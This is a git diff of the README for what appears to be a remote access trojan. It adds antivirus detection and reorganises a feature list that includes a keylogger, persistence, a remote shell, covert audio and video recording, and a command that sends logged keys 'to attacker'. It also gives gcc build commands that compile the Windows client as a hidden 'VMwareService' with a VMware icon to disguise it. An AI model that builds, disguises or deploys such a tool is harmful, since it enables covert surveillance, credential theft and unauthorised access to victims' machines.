@@ -28,31 +28,34 @@ En desarollo...
 
 # News
 
-## Better Windows Shell
+## Windows
 
-- A wonderfull PowerShell shell.
+- ### AvDetector
+    - A new function to detect AVs has been added
+
+- ### Better Windows Shell
+    - A wonderfull PowerShell shell.
+
+- ### Keylogger
+    - A new keylogger has been added on Windows.
 
 
-## Keylogger
+## Linux
 
-- A new keylogger has been added on Windows.
-
-### Code optimization
-
-- The code has been optmized, some functions like download/upload has been fixed to download data/binary.
-
-### Functions to record video & audio.
-
-- LINUX: 
+- ### Functions to record video & audio.
+ 
     - New function to record a 10s video. 
     - New function to record a 10s audio.
 
-- Windows: 
-    - New function to record a 10s of audio.
+## General
 
+- ### Code optimization
 
-# Aviable Commands
-Por el momento tenemos disponible los siguientes comandos:
+    - I added a "cache" memory for those command that the output doesn't change. Like: checkAv, sysinfo, ...
+    
+
+ # Aviable Commands
+By the moment we have those commands:
 
     - help            -> Show help message
     - shell           -> Enter shell mode ("q" for exit)
@@ -63,7 +66,8 @@ Por el momento tenemos disponible los siguientes comandos:
     - lowpersistence  -> Set persistence (no root)
     - peristence      -> Set persistence (root needed)
     - check           -> List privileges
-    - record          -> Take a 10s audio
+    - checkAv         -> Detect Installed AV (ONLY WINDOWS)
+    - record          -> Take a 10s audio 
     - video           -> Take a 10s video (720p) [ONLY LINUX]
     - dumpkeys        -> Send to attacker de keys log
     - q / exit        -> Exit server
@@ -112,10 +116,10 @@ Modificamos el archivo **[src/mainFuctsWin.c](src/mainFuctsWin.c)** especificand
 
 - [Cliente](Windows/client.c) + **VMWARE ICON**:
 
-      gcc -mwindows .\clientWin.c -o .\dist\VMwareService -lws2_32 -lShlwapi -lwinmm -lpthread ../src/icon.o
+      gcc -mwindows -static .\clientWin.c -o .\dist\VMwareService -lws2_32 -lShlwapi -lwinmm -lpthread ../src/icon.o
 - [Cliente](Windows/client.c):
 
-      gcc -mwindows .\clientWin.c -o .\dist\VMwareService -lws2_32 -lShlwapi -lwinmm -lpthread
+      gcc -mwindows -static .\clientWin.c -o .\dist\VMwareService -lws2_32 -lShlwapi -lwinmm -lpthread
 - [Server](Windows/server.c):
 
       gcc .\serverWin.c -o .\dist\server -lws2_32 -lShlwapi
